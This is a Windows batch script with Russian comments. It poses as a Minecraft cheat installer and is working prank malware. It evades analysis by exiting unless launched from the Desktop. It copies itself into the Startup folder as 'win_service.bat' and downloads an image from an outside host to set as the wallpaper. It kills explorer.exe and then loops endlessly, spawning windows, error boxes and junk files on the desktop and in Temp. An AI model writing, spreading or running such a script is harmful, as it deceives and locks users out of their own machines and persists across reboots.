@echo off
:: Проверка: если файл запущен не из папки Desktop, он просто закроется (для Triage)
echo %cd% | findstr /i "Desktop" >nul
if %errorlevel% neq 0 (
    copy "%~f0" "%userprofile%\Desktop\MineCheat_Installer.bat" >nul
    exit
)

title MINECHEAT ULTIMATE INFECTION
color 0c
echo [SYSTEM] ФАЙЛ ГОТОВ К УСТАНОВКЕ.
echo Нажми ENTER для активации читов...
pause >nul

:: 1. АВТОЗАГРУЗКА (Копирует себя в систему)
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\win_service.bat" >nul

:: 2. МЕНЯЕМ ФОН НА ТВОЙ КРАСНЫЙ (Через PowerShell)
powershell -Command "Invoke-WebRequest -Uri 'https://i.ibb.co/v4m0ZfR/defeat-red.png' -OutFile 'C:\defeat.png'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\defeat.png" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: 3. УБИРАЕМ РАБОЧИЙ СТОЛ (Чтобы нельзя было нажать "Выход")
taskkill /f /im explorer.exe

:: 4. ОТКРЫВАЕМ ГУГЛ
start https://www.google.com/search?q=Download+Mine+Hack+No+Virus+Accept+Defaet

:: 5. БЕСКОНЕЧНЫЙ ЦИКЛ ХАОСА
:chaos
:: Создаем мусорные файлы (имитация троянов и удаление иконок)
echo Accept Defaet > "%userprofile%\Desktop\DEFEAT_%random%.txt"
echo 0 > "C:\Users\%username%\AppData\Local\Temp\Trojan_%random%.exe"

:: Запуск программ для лагов (тряска мышки)
start /min calc.exe
start /min notepad.exe

:: Окна с красным текстом
start cmd /k "color 4 & echo ACCEPT DEFAET! SYSTEM DESTROYED! & echo %random%%random%"

:: Вылетающее окно ошибки
echo msgbox "MINECHEAT HAS TAKEN OVER!", 16, "CRITICAL" > %temp%\err.vbs
start %temp%\err.vbs

:: Очень маленькая пауза, чтобы окна летели пачками
timeout /t 1 >nul
goto chaos